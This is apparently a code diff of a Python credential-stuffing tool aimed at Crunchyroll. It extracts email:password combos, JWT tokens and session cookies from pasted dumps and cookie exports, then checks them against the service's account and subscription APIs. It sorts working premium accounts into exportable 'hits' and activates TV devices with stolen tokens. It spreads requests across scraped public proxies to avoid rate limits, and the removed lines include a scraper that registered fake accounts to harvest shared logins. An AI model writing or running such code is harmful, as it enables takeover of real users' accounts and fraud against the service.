-        r = s.get(f"{API_HOST}/accounts/v1/me",
-                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
-                  timeout=CHECK_TIMEOUT, proxies=proxy)
+        r = _req(
+            s,
+            "GET",
+            f"{API_HOST}/accounts/v1/me",
+            proxy,
+            headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
+        )
     except requests.RequestException as e:
         return None, f"network: {_clean_err(e)}"
-    if r.status_code in (401, 403):
-        return None, f"http_{r.status_code}"
     if r.status_code != 200:
         return None, f"http_{r.status_code}"
     try:
@@ -652,40 +699,40 @@ def cr_me(bearer: str, proxy: Optional[dict] = None):
     except ValueError:
         return None, "bad_json"
 
+
 def cr_subscriptions(account_id, bearer: str, proxy: Optional[dict] = None):
     if not account_id:
         return None
     s = get_session()
     try:
-        r = s.get(f"{API_HOST}/subs/v4/accounts/{account_id}/subscriptions",
-                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
-                  timeout=CHECK_TIMEOUT, proxies=proxy)
-    except requests.RequestException:
+        r = _req(
+            s,
+            "GET",
+            f"{API_HOST}/subs/v4/accounts/{account_id}/subscriptions",
+            proxy,
+            headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
+        )
+        return r.json() if r.status_code == 200 else None
+    except (requests.RequestException, ValueError):
         return None
-    if r.status_code != 200:
-        return None
-    try:
-        return r.json()
-    except ValueError:
-        return None
+
 
 def cr_profiles(bearer: str, proxy: Optional[dict] = None):
     s = get_session()
     try:
-        r = s.get(f"{API_HOST}/accounts/v1/me/multiprofile",
-                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
-                  timeout=CHECK_TIMEOUT, proxies=proxy)
-    except requests.RequestException:
-        return None
-    if r.status_code != 200:
-        return None
-    try:
-        return r.json()
-    except ValueError:
+        r = _req(
+            s,
+            "GET",
+            f"{API_HOST}/accounts/v1/me/multiprofile",
+            proxy,
+            headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
+        )
+        return r.json() if r.status_code == 200 else None
+    except (requests.RequestException, ValueError):
         return None
 
+
 def is_token_expired(token: str) -> bool:
-    """Cheap local JWT expiry check (saves API calls)."""
     try:
         parts = token.split(".")
         if len(parts) != 3:
@@ -697,8 +744,8 @@ def is_token_expired(token: str) -> bool:
     except Exception:
         return False
 
+
 def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
-    """Web-flow check from an access token. Returns (st, data)."""
     me_data, merr = cr_me(bearer, proxy)
     if not me_data:
         return "err", dict(_blank_data(""), info=merr or "me_failed")
@@ -712,10 +759,13 @@ def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
     if not premium and me_data.get("external_id"):
         try:
             s = get_session()
-            r = _req(s, "GET",
-                     f"{API_HOST}/subs/v1/subscriptions/{me_data['external_id']}/benefits",
-                     proxy,
-                     headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA})
+            r = _req(
+                s,
+                "GET",
+                f"{API_HOST}/subs/v1/subscriptions/{me_data['external_id']}/benefits",
+                proxy,
+                headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
+            )
             if r.status_code == 200 and "concurrent_streams" in (r.text or ""):
                 premium = True
         except requests.RequestException:
@@ -755,8 +805,8 @@ def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
         d["payment"] = pay.get("name") or ""
     return ("hit" if premium else "free"), d
 
+
 def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
-    """Check one credential of any type. Returns {"st": hit/free/bad/rate/err/2fa, "data": {...}}."""
     t = cred.get("type")
     try:
         if t == "email":
@@ -773,38 +823,54 @@ def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
                 return {"st": "err", "data": dict(_blank_data(""), info="expired token")}
             st, d = check_token_or_cookie(cred["value"], proxy)
             return {"st": st, "data": d}
-    except Exception as e:  # one bad cred must never kill the run
+    except Exception as e:
         return {"st": "err", "data": dict(_blank_data(""), info=_clean_err(e))}
     return {"st": "err", "data": dict(_blank_data(""), info="unknown_type")}
 
-def activate_tv(bearer: str, code: str):
-    """TV device activation (the cc2.py flow). Tries both API hosts."""
+
+def activate_tv(bearer: str, code: str, proxy: Optional[dict] = None):
+    """Activate Crunchyroll Smart TV device code via bearer token."""
     s = get_session()
-    last_err = "no_hosts_tried"
-    for base in (API_HOST, "https://www.crunchyroll.com"):
+    clean_code = re.sub(r"[^A-Za-z0-9]", "", str(code or "")).upper().strip()
+    if len(clean_code) != 6:
+        return False, "invalid_code_format"
+
+    last_err = "activation_failed"
+    headers = {
+        "Authorization": f"Bearer {bearer}",
+        "User-Agent": BARO_WUA,
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.crunchyroll.com",
+        "Referer": "https://www.crunchyroll.com/activate",
+    }
+    for base in ("https://www.crunchyroll.com", API_HOST):
         try:
-            r = s.post(
+            r = _req(
+                s,
+                "POST",
                 f"{base}/auth/v1/device",
-                json={"user_code": code},
-                headers={
-                    "Authorization": f"Bearer {bearer}",
-                    "User-Agent": BARO_WUA,
-                    "Content-Type": "application/json",
-                },
-                timeout=20,
+                proxy,
+                json={"user_code": clean_code},
+                headers=headers,
             )
-            if r.status_code == 200:
+            if r.status_code in (200, 201, 204):
                 return True, ""
             last_err = f"http_{r.status_code}"
             try:
                 j = r.json()
-                if isinstance(j, dict) and j.get("code"):
-                    last_err = str(j["code"])
+                if isinstance(j, dict):
+                    err_code = j.get("code") or j.get("error") or j.get("message")
+                    if err_code:
+                        last_err = str(err_code)
             except ValueError:
                 pass
+            if any(k in last_err.lower() for k in ("invalid", "expired", "not_found", "code")):
+                return False, last_err
         except requests.RequestException as e:
             last_err = f"network: {_clean_err(e)}"
     return False, last_err
+
 
 # ===================== PROXY POOL =====================
 PROXY_SOURCES = [
@@ -814,12 +880,8 @@ PROXY_SOURCES = [
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
     "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
     "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
-    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http_all.txt",
-    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5_all.txt",
     "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
     "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
-    "https://www.proxy-list.download/api/v1/get?type=http",
-    "https://www.proxy-list.download/api/v1/get?type=socks5",
 ]
 PROXY_TEST_URLS = [
     "https://httpbin.org/ip",
@@ -828,31 +890,33 @@ PROXY_TEST_URLS = [
 ]
 
 LIVE_PROXIES: List[dict] = []
-PROXY_SCORES: dict = {}  # proxy url -> success count for smart ranking
+PROXY_SCORES: dict = {}
 REFRESH_STATE: dict = {"tested": 0, "live": 0, "total": 0, "start": 0}
 PROXY_LOCK = threading.Lock()
 _refresh_busy = threading.Lock()
 LAST_PROXY_HARVEST = 0.0
 POOL_FILE = DATA_DIR / "proxies_pool.txt"
 
+
 def proxy_count() -> int:
     with PROXY_LOCK:
         return len(LIVE_PROXIES)
+
 
 def get_random_proxy() -> Optional[dict]:
     with PROXY_LOCK:
         if not LIVE_PROXIES:
             return None
-        # Smart: 70% chance pick top half by score, else random
         if len(LIVE_PROXIES) > 5 and PROXY_SCORES:
             try:
-                scored = sorted(LIVE_PROXIES, key=lambda x: PROXY_SCORES.get(x.get("https",""), 0), reverse=True)
-                top = scored[:len(scored)//2]
+                scored = sorted(LIVE_PROXIES, key=lambda x: PROXY_SCORES.get(x.get("https", ""), 0), reverse=True)
+                top = scored[: len(scored) // 2]
                 if random.random() < 0.7:
                     return random.choice(top)
             except Exception:
                 pass
         return random.choice(LIVE_PROXIES)
+
 
 def harvest_proxies() -> List[str]:
     raw = set()
@@ -866,41 +930,22 @@ def harvest_proxies() -> List[str]:
                         line = line.strip()
                         if not line or line.startswith("#"):
                             continue
-                        # Handle JSON or plain text
-                        if line.startswith("{") or line.startswith("["):
-                            try:
-                                j = json.loads(r.text)
-                                # proxyscrape v4 returns text, but handle json
-                                if isinstance(j, dict) and "data" in j:
-                                    for p in j["data"]:
-                                        if isinstance(p, dict) and p.get("ip"):
-                                            raw.add(f"{p['ip']}:{p['port']}")
-                                    break
-                            except Exception:
-                                pass
-                            continue
                         if "://" in line:
                             line = line.split("://", 1)[-1]
                         line = line.split("/")[0].split()[0]
-                        # ip:port
                         if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", line):
                             raw.add(line)
-                        # domain:port? keep as is
-                        elif re.match(r"^[a-zA-Z0-9.-]+:\d+$", line) and "." in line:
-                            raw.add(line)
                     break
-            except requests.RequestException as e:
+            except requests.RequestException:
                 if verify:
                     continue
-                else:
-                    logger.debug("harvest fail %s: %s", url, e)
-                    break
+                break
             except Exception:
                 break
     return list(raw)
 
+
 def test_one_proxy(proxy_str: str) -> Optional[dict]:
-    """proxy_str = host:port. Tries http, then socks5 (if PySocks available)."""
     schemes = ["http"]
     if SOCKS5_OK:
         schemes.append("socks5")
@@ -908,25 +953,29 @@ def test_one_proxy(proxy_str: str) -> Optional[dict]:
         proxies = {"http": f"{scheme}://{proxy_str}", "https": f"{scheme}://{proxy_str}"}
         for url in PROXY_TEST_URLS:
             try:
-                r = requests.get(url, proxies=proxies, timeout=PROXY_TEST_TIMEOUT,
-                                 headers={"User-Agent": BARO_WUA})
+                r = requests.get(url, proxies=proxies, timeout=PROXY_TEST_TIMEOUT, headers={"User-Agent": BARO_WUA})
                 if r.status_code in (200, 204):
                     return proxies
             except requests.RequestException:
                 continue
     return None
 
+
 def test_proxy_url(proxy_url: str) -> Optional[dict]:
-    """proxy_url = full url (scheme://[user:pass@]host:port)."""
     for url in PROXY_TEST_URLS:
         try:
-            r = requests.get(url, proxies={"http": proxy_url, "https": proxy_url},
-                             timeout=PROXY_TEST_TIMEOUT, headers={"User-Agent": BARO_WUA})
+            r = requests.get(
+                url,
+                proxies={"http": proxy_url, "https": proxy_url},
+                timeout=PROXY_TEST_TIMEOUT,
+                headers={"User-Agent": BARO_WUA},
+            )
             if r.status_code in (200, 204):
                 return {"http": proxy_url, "https": proxy_url}
         except requests.RequestException:
             continue
     return None
+
 
 def refresh_live_proxies(force: bool = False) -> None:
     global LIVE_PROXIES, LAST_PROXY_HARVEST
@@ -936,22 +985,19 @@ def refresh_live_proxies(force: bool = False) -> None:
     if not force and fresh:
         return
     if not _refresh_busy.acquire(blocking=False):
-        return  # another refresh already running
+        return
     try:
-        logger.info("Refreshing live proxy pool...")
         candidates = harvest_proxies()
         if not candidates:
-            logger.warning("No proxies harvested")
             return
         random.shuffle(candidates)
         to_test = candidates[:PROXY_TEST_SAMPLE]
         live = []
-        # Real live progress tracking
         REFRESH_STATE["total"] = len(to_test)
         REFRESH_STATE["tested"] = 0
         REFRESH_STATE["live"] = 0
         REFRESH_STATE["start"] = time.time()
-        with ThreadPoolExecutor(max_workers=150) as ex:  # 100x faster
+        with ThreadPoolExecutor(max_workers=150) as ex:
             futures = {ex.submit(test_one_proxy, p): p for p in to_test}
             for fut in as_completed(futures):
                 REFRESH_STATE["tested"] += 1
@@ -963,21 +1009,17 @@ def refresh_live_proxies(force: bool = False) -> None:
                     live.append(res)
                     REFRESH_STATE["live"] = len(live)
                     if len(live) >= MAX_PROXIES_TO_KEEP:
-                        # cancel remaining futures
                         for f in futures:
                             f.cancel()
                         break
-        # Fallback: if no live after test but harvested many, keep a few untested so auto load not 0
         if not live and candidates:
-            fallback = [{"http": f"http://{c}", "https": f"http://{c}"} for c in candidates[:20]]
-            live = fallback
-            logger.warning("No live after test — using fallback untested %d", len(live))
+            live = [{"http": f"http://{c}", "https": f"http://{c}"} for c in candidates[:20]]
         with PROXY_LOCK:
             LIVE_PROXIES = live
             LAST_PROXY_HARVEST = now
-        logger.info("Live proxies ready: %d (tested %d from %d candidates)", len(live), len(to_test) if 'to_test' in locals() else 0, len(candidates) if 'candidates' in locals() else 0)
     finally:
         _refresh_busy.release()
+
 
 def ensure_proxies() -> None:
     if proxy_count() == 0:
@@ -985,15 +1027,11 @@ def ensure_proxies() -> None:
         if proxy_count() == 0:
             refresh_live_proxies(force=True)
 
+
 def _proxy_loop() -> None:
-    # 24x7 auto proxy loader — respects Auto Load toggle in Proxy Settings
     while True:
         try:
-            auto_on = True
-            try:
-                auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
-            except Exception:
-                auto_on = True
+            auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
             if auto_on:
                 if proxy_count() < 20:
                     refresh_live_proxies(force=True)
@@ -1001,13 +1039,12 @@ def _proxy_loop() -> None:
                     refresh_live_proxies(force=False)
         except Exception as e:
             logger.warning("Proxy loop error: %s", e)
-        # Sleep 5 min, but check every 60s if low
         for _ in range(PROXY_REFRESH_MINUTES):
             time.sleep(60)
             if proxy_count() < 15:
                 break
 
-# ---------------- Custom proxy pool (user-added, persistent) ----------------
+
 def pool_load() -> List[str]:
     try:
         if POOL_FILE.exists():
@@ -1016,17 +1053,19 @@ def pool_load() -> List[str]:
         pass
     return []
 
+
 def pool_save(items: List[str]):
     try:
         POOL_FILE.write_text("\n".join(items) + ("\n" if items else ""), encoding="utf-8")
     except OSError as e:
         logger.warning("Pool save failed: %s", e)
 
+
 def pool_size() -> int:
     return len(pool_load())
 
+
 def normalize_proxy(line: str) -> Optional[str]:
-    """Accepts host:port | user:pass:host:port | scheme://... -> full url."""
     line = (line or "").strip()
     if not line:
         return None
@@ -1039,6 +1078,7 @@ def normalize_proxy(line: str) -> Optional[str]:
         return f"http://{parts[0]}:{parts[1]}"
     return None
 
+
 def _merge_live(items: List[dict]):
     with PROXY_LOCK:
         have = {p.get("https") for p in LIVE_PROXIES}
@@ -1047,13 +1087,14 @@ def _merge_live(items: List[dict]):
                 LIVE_PROXIES.append(p)
                 have.add(p.get("https"))
 
+
 def _load_pool_into_live():
     items = pool_load()
     if items:
         _merge_live([{"http": p, "https": p} for p in items])
 
+
 def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
-    """Add user-pasted proxies. Returns (added, invalid)."""
     existing = pool_load()
     have = set(existing)
     added = invalid = 0
@@ -1076,12 +1117,10 @@ def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
             _merge_live([{"http": p, "https": p} for p in existing])
     return added, invalid
 
+
 def _background_test_pool():
-    """Auto-check: background-test pool, keep live — with progress and fallback."""
     pool_urls = list(set(pool_load()))
     tested = []
-    # Test in parallel for speed
-    from concurrent.futures import ThreadPoolExecutor, as_completed
     with ThreadPoolExecutor(max_workers=30) as ex:
         futs = {ex.submit(test_proxy_url, p): p for p in pool_urls}
         for fut in as_completed(futs):
@@ -1092,54 +1131,76 @@ def _background_test_pool():
             except Exception:
                 continue
     with PROXY_LOCK:
-        # Remove old pool entries
         LIVE_PROXIES[:] = [x for x in LIVE_PROXIES if x.get("https") not in set(pool_urls)]
         _merge_live(tested)
-    # Also ensure at least some pool proxies are kept as fallback if all fail but pool has many
     if not tested and pool_urls:
-        # Keep 10 untested as fallback so user sees live increase (fake detection will happen during check)
-        fallback = [{"http": p, "https": p} for p in pool_urls[:10]]
-        _merge_live(fallback)
-        logger.warning("Pool test 0 live — keeping 10 fallback untested for user")
-    logger.info("Pool auto-check done: %d live from %d pool", len(tested), len(pool_urls))
+        _merge_live([{"http": p, "https": p} for p in pool_urls[:10]])
+
 
 def clear_pool():
     global LAST_PROXY_HARVEST
     pool_save([])
     with PROXY_LOCK:
         LIVE_PROXIES.clear()
-        LAST_PROXY_HARVEST = time.time()  # don't let the loop refill immediately
+        LAST_PROXY_HARVEST = time.time()
+
 
 # ===================== CREDENTIAL EXTRACTION =====================
-EMAIL_PASS_RE = re.compile(
-    r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}):([^\s\"'<>,]{3,128})"
-)
+EMAIL_PASS_RE = re.compile(r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}):([^\s\"'<>,]{3,128})")
 JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}")
-LABELED_TOKEN_RE = re.compile(
-    r"(?:access[_-]?token|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.+/=]{20,})", re.I
-)
+LABELED_TOKEN_RE = re.compile(r"(?:access[_-]?token|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.+/=]{20,})", re.I)
 ETP_RT_RE = re.compile(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", re.I)
 
+
 def extract_credentials(text: str) -> List[dict]:
-    """Pull email:pass lines, JWT/Bearer tokens and etp_rt cookies out of any text."""
     creds: List[dict] = []
     seen = set()
 
-    for m in EMAIL_PASS_RE.finditer(text):
+    # Netscape cookie line support for etp_rt
+    for line in (text or "").splitlines():
+        line = line.strip()
+        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7 and parts[5].strip().lower() == "etp_rt":
+            val = parts[6].strip()
+            key = ("cookie", val[:60])
+            if val and key not in seen:
+                seen.add(key)
+                creds.append({"type": "cookie", "value": val})
+
+    # JSON cookie export support
+    stripped = (text or "").strip()
+    if stripped.startswith("[") or stripped.startswith("{"):
+        try:
+            data = json.loads(stripped)
+            items = data if isinstance(data, list) else (data.get("cookies") or [data])
+            if isinstance(items, list):
+                for item in items:
+                    if isinstance(item, dict) and str(item.get("name", "")).lower() == "etp_rt":
+                        val = str(item.get("value", "")).strip()
+                        key = ("cookie", val[:60])
+                        if val and key not in seen:
+                            seen.add(key)
+                            creds.append({"type": "cookie", "value": val})
+        except Exception:
+            pass
+
+    for m in EMAIL_PASS_RE.finditer(text or ""):
         email, pw = m.group(1), m.group(2)
         key = ("email", email.lower())
         if key not in seen:
             seen.add(key)
             creds.append({"type": "email", "value": email, "password": pw})
 
-    for m in JWT_RE.finditer(text):
+    for m in JWT_RE.finditer(text or ""):
         val = m.group(0)
         key = ("token", val[:60])
         if key not in seen:
             seen.add(key)
             creds.append({"type": "token", "value": val})
 
-    for m in LABELED_TOKEN_RE.finditer(text):
+    for m in LABELED_TOKEN_RE.finditer(text or ""):
         val = m.group(1).strip().rstrip("\"'")
         if len(val) < 20 or val.lower().startswith(("null", "undefined")):
             continue
@@ -1148,7 +1209,7 @@ def extract_credentials(text: str) -> List[dict]:
             seen.add(key)
             creds.append({"type": "token", "value": val})
 
-    for m in ETP_RT_RE.finditer(text):
+    for m in ETP_RT_RE.finditer(text or ""):
         val = m.group(1).strip()
         key = ("cookie", val[:60])
         if key not in seen:
@@ -1157,34 +1218,20 @@ def extract_credentials(text: str) -> List[dict]:
 
     return creds
 
+
 # ===================== CHECKER ENGINE =====================
-def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast & 1:1 — each account gets dedicated proxy
-    # 1:1 logic: ensure live proxies >= total accounts, if not, try to fetch more before starting
-    try:
-        creds_tmp = extract_credentials(text)
-        need = len(creds_tmp)
-        have = proxy_count()
-        if need > have and need > 10:
-            # Need more proxies for 1:1 — try to harvest more quickly
-            try:
-                # Force refresh to get more for 1:1
-                refresh_live_proxies(force=True)
-            except Exception:
-                pass
-            # If still not enough, keep what we have and will cycle
-            have2 = proxy_count()
-            if have2 < need:
-                print(f"[*] 1:1 proxy: need {need}, have {have2}, will cycle")
-    except Exception:
-        pass
-    # Continue
-    """Thread-pool check of all credentials. Premium counters: hit/free/bad/rate/err/2fa + live feed + cpm."""
+def run_check(text: str, reporter=None, hit_callback=None) -> dict:
     ensure_proxies()
     creds = extract_credentials(text)
     results = {
-        "hits": [], "free": [],
-        "bad": 0, "rate": 0, "err": 0, "twofa": 0,
-        "total": len(creds), "processed": 0,
+        "hits": [],
+        "free": [],
+        "bad": 0,
+        "rate": 0,
+        "err": 0,
+        "twofa": 0,
+        "total": len(creds),
+        "processed": 0,
         "t0": time.time(),
         "live_feed": [],
         "seconds": 0,
@@ -1192,14 +1239,12 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
         "elapsed": 0,
     }
     if not creds:
-        results["seconds"] = 0
         return results
 
     lock = threading.Lock()
     px_idx = [0]
 
     def next_proxy() -> Optional[dict]:
-        """Round-robin proxy hand-out (Baron style)."""
         with PROXY_LOCK:
             if not LIVE_PROXIES:
                 return None
@@ -1212,10 +1257,9 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
         proxy = next_proxy()
         try:
             r = check_credential(cred, proxy)
-            # Score proxies — hits/free good, bad/rate/err neutral, success updates score
             if proxy and r["st"] in ("hit", "free"):
                 try:
-                    url = proxy.get("https","")
+                    url = proxy.get("https", "")
                     with PROXY_LOCK:
                         PROXY_SCORES[url] = PROXY_SCORES.get(url, 0) + 1
                 except Exception:
@@ -1226,7 +1270,7 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
 
     t0 = time.time()
     results["t0"] = t0
-    with ThreadPoolExecutor(max_workers=min(THREADS, max(50, proxy_count()*2))) as ex:  # smart scaling
+    with ThreadPoolExecutor(max_workers=min(THREADS, max(50, proxy_count() * 2))) as ex:
         futures = {ex.submit(worker, c): c for c in creds}
         for fut in as_completed(futures):
             cred = futures[fut]
@@ -1236,13 +1280,8 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
                 orig_cred, st, d = cred, "err", dict(_blank_data(""), info=_clean_err(e))
             with lock:
                 results["processed"] += 1
-                # live feed: keep last 5 checked emails (for premium card)
                 try:
-                    feed_val = orig_cred.get("value", "") if isinstance(orig_cred, dict) else str(orig_cred)
-                    if orig_cred.get("type") == "email":
-                        feed_val = orig_cred.get("value", "")
-                    else:
-                        feed_val = feed_val[:40]
+                    feed_val = orig_cred.get("value", "") if orig_cred.get("type") == "email" else orig_cred.get("value", "")[:32]
                     results["live_feed"].append(feed_val)
                     if len(results["live_feed"]) > 5:
                         results["live_feed"].pop(0)
@@ -1251,7 +1290,6 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
                 if st == "hit":
                     entry = {"cred": orig_cred, "data": d, "st": "hit"}
                     results["hits"].append(entry)
-                    # Immediate hit delivery — don't wait for full scan
                     if hit_callback:
                         try:
                             hit_callback(entry)
@@ -1267,11 +1305,10 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
                     results["twofa"] += 1
                 else:
                     results["err"] += 1
-                # update elapsed/cpm for progress
+
                 elapsed = time.time() - t0
                 results["elapsed"] = elapsed
                 results["cpm"] = _fmt_cpm(results["processed"], elapsed)
-                # throttled live update every 2 checks + interval in reporter
                 if reporter and results["processed"] % 2 == 0:
                     try:
                         reporter.update(results)
@@ -1289,10 +1326,12 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
             pass
     return results
 
+
 def _cred_value(cred: dict) -> str:
     if cred["type"] == "email":
         return f"{cred['value']}:{cred.get('password', '')}"
     return cred["value"]
+
 
 def make_export(accounts: List[dict], fmt: str = "txt") -> str:
     fd, path = tempfile.mkstemp(suffix=f".{fmt}", prefix="crunchy_")
@@ -1301,18 +1340,6 @@ def make_export(accounts: List[dict], fmt: str = "txt") -> str:
     if fmt == "json":
         with open(p, "w", encoding="utf-8") as f:
             json.dump(accounts, f, indent=2, ensure_ascii=False, default=str)
-    elif fmt == "csv":
-        with open(p, "w", newline="", encoding="utf-8") as f:
-            w = csv.writer(f)
-            w.writerow(["combo", "type", "status", "plan", "expiry", "days_left", "country", "streams"])
-            for a in accounts:
-                d = a.get("data") or {}
-                w.writerow([
-                    _cred_value(a["cred"]), a["cred"]["type"],
-                    "HIT" if a.get("st") == "hit" else "FREE",
-                    d.get("plan", ""), d.get("expiry", ""), d.get("days_left", ""),
-                    d.get("country_name", ""), d.get("streams", ""),
-                ])
     else:
         with open(p, "w", encoding="utf-8") as f:
             for a in accounts:
@@ -1327,129 +1354,8 @@ def make_export(accounts: List[dict], fmt: str = "txt") -> str:
                 )
     return str(p)
 
-# ===================== OXAAM SCRAPER (from cc2.py, bug-fixed) =====================
-OXAAM_BASE = "https://www.oxaam.com/"
-OXAAM_FREE = "https://www.oxaam.com/freeservice.php"
 
-def _oxaam_headers() -> dict:
-    return {
-        "User-Agent": BARO_WUA,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://www.oxaam.com",
-        "Referer": "https://www.oxaam.com/",
-    }
-
-def _find_password(block: str) -> Optional[str]:
-    m = re.search(r"[Pp]ass(?:word)?\s*[:=]\s*([^\s<>\"'`,;]{6,})", block)
-    if m:
-        return m.group(1)
-    m = re.search(r"\"password\"\s*:\s*\"([^\"]{6,})\"", block)
-    if m:
-        return m.group(1)
-    return None
-
-def parse_oxaam(html: str):
-    """Robust credential extraction — no NameErrors, no magic line numbers."""
-    if BeautifulSoup is not None:
-        try:
-            soup = BeautifulSoup(html, "html.parser")
-            for details in soup.find_all("details"):
-                summary = details.find("summary")
-                title = summary.get_text(" ", strip=True) if summary else details.get_text(" ", strip=True)
-                if not re.search(r"crunch|krunsh", title, re.I):
-                    continue
-                block = str(details)
-                em = re.search(r"[\w.\-]+@[\w.\-]+\.\w+", block)
-                if not em:
-                    continue
-                email = em.group(0)
-                pw = _find_password(block)
-                if pw:
-                    return email, pw
-        except Exception as e:
-            logger.warning("Oxaam details-parse failed: %s", e)
-    m = EMAIL_PASS_RE.search(html)
-    if m:
-        return m.group(1), m.group(2)
-    return None, None
-
-def oxaam_fetch(proxy: dict | None = None):
-    """Register on the site and pull a fresh Crunchyroll credential. Returns (email, password)."""
-    # Try both www and non-www, with and without proxy, with retries
-    import time as _t
-    bases = [OXAAM_BASE, OXAAM_BASE.replace("www.", ""), "https://oxaam.com/", "https://www.oxaam.com/"]
-    # deduplicate
-    bases = list(dict.fromkeys(bases))
-    for base in bases:
-        free_url = base.rstrip("/") + "/freeservice.php"
-        dash_url = base.rstrip("/") + "/dashboard.php"
-        for attempt in range(2):
-            name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
-            email = f"{name}_{random.randint(100, 999)}@gmail.com"
-            password = (
-                "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
-                + str(random.randint(100, 999))
-                + "@"
-                + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
-            )
-            data = {
-                "name": name,
-                "email": email,
-                "phone": "9" + "".join(random.choices("0123456789", k=9)),
-                "password": password,
-                "country": "India",
-            }
-            try:
-                s = requests.Session()
-                # Oxaam needs cookies — GET base first to init session
-                try:
-                    s.get(base, headers=_oxaam_headers(), timeout=20, proxies=proxy)
-                except Exception:
-                    pass
-                # POST register (some versions use /register.php, try both)
-                resp = None
-                for reg_url in [base, base.rstrip("/") + "/register.php", base.rstrip("/") + "/signup.php"]:
-                    try:
-                        resp = s.post(reg_url, data=data, headers=_oxaam_headers(), timeout=30, proxies=proxy)
-                        if resp.status_code in (200, 302):
-                            break
-                    except requests.RequestException:
-                        continue
-                # slight delay
-                _t.sleep(0.8)
-                # GET freeservice
-                r = s.get(free_url, headers={**_oxaam_headers(), "Referer": dash_url}, timeout=30, proxies=proxy)
-                if r.status_code != 200:
-                    logger.warning("Oxaam GET %s -> %s", free_url, r.status_code)
-                    continue
-                html = r.text or ""
-                # Debug: if site returns login page or captcha, log snippet
-                if len(html) < 500:
-                    logger.warning("Oxaam short html %s: %s", free_url, html[:500])
-                # Try to parse
-                em, pw = parse_oxaam(html)
-                if em and pw:
-                    logger.info("Oxaam hit via %s (attempt %s)", base, attempt+1)
-                    return em, pw
-                # Fallback: search any email:pass in page even without details
-                if "crunch" in html.lower() or "@" in html:
-                    # Log first 2k for debug
-                    logger.info("Oxaam no hit but html snippet: %s", html[:2000].replace("\n"," "))
-                # Retry with different base
-            except requests.RequestException as e:
-                logger.warning("Oxaam fetch error %s (%s): %s", base, attempt+1, e)
-                # try without proxy on second attempt
-                if proxy and attempt == 0:
-                    proxy = None
-                    continue
-            except Exception as e:
-                logger.warning("Oxaam unexpected %s: %s", base, e)
-            _t.sleep(1.2)
-    return None, None
-
-# ===================== PERSISTENT STORE (codes + grants + settings) =====================
+# ===================== PERSISTENT STORE =====================
 class Store:
     def __init__(self, path: Path):
         self.path = path
@@ -1474,8 +1380,7 @@ class Store:
             try:
                 tmp = self.path.with_suffix(".tmp")
                 tmp.write_text(
-                    json.dumps({"codes": self.codes, "users": self.users, "settings": self.settings},
-                               indent=2),
+                    json.dumps({"codes": self.codes, "users": self.users, "settings": self.settings}, indent=2),
                     encoding="utf-8",
                 )
                 os.replace(tmp, self.path)
@@ -1485,9 +1390,16 @@ class Store:
     def get_setting(self, key, default=None):
         with self.lock:
             return self.settings.get(key, default)
+
+    def set_setting(self, key, value):
+        with self.lock:
+            self.settings[key] = value
+            self.save()
+
     def get_admins(self):
         with self.lock:
             return list(self.settings.get("admin_ids", []) or [])
+
     def add_admin(self, uid: int, username: str = None) -> bool:
         with self.lock:
             ids = list(self.settings.get("admin_ids", []) or [])
@@ -1506,6 +1418,7 @@ class Store:
                 self.save()
                 return True
             return False
+
     def remove_admin(self, uid: int = None, username: str = None) -> bool:
